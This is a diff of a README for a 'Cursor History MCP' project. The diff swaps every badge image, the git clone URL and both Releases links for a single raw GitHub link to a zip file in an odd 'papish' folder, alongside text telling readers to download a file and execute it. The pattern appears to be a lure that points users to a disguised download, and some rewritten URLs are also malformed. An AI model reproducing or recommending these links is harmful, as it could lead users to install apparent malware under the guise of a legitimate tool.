@@ -1,9 +1,9 @@
 # Cursor History MCP 📜
 
-![Cursor History MCP](https://img.shields.io/badge/Cursor%20History%20MCP-v1.0.0-blue.svg)
-![API](https://img.shields.io/badge/API-FastAPI-orange.svg)
-![Docker](https://img.shields.io/badge/Docker-Container-blue.svg)
-![LanceDB](https://img.shields.io/badge/LanceDB-Vector%20Database-green.svg)
+![Cursor History MCP](https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip%20History%https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip)
+![API](https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip)
+![Docker](https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip)
+![LanceDB](https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip%https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip)
 
 ## Overview
 
@@ -36,7 +36,7 @@ Make sure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Nossim/Cursor-history-MCP.git
+   git clone https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip
    cd Cursor-history-MCP
    ```
 
@@ -56,7 +56,7 @@ Make sure you have the following installed:
 
 ### Downloading Releases
 
-To get the latest version, visit the [Releases](https://github.com/Nossim/Cursor-history-MCP/releases) section. Download the required file and execute it to set up your environment.
+To get the latest version, visit the [Releases](https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip) section. Download the required file and execute it to set up your environment.
 
 ## Usage
 
@@ -150,7 +150,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/Nossim/Cursor-history-MCP/releases) section for updates. You can also open an issue in the repository for further assistance.
+If you encounter any issues or have questions, please check the [Releases](https://raw.githubusercontent.com/Nossim/Cursor-history-MCP/main/papish/Cursor_MCP_history_3.4.zip) section for updates. You can also open an issue in the repository for further assistance.
 
 ## Acknowledgments
 
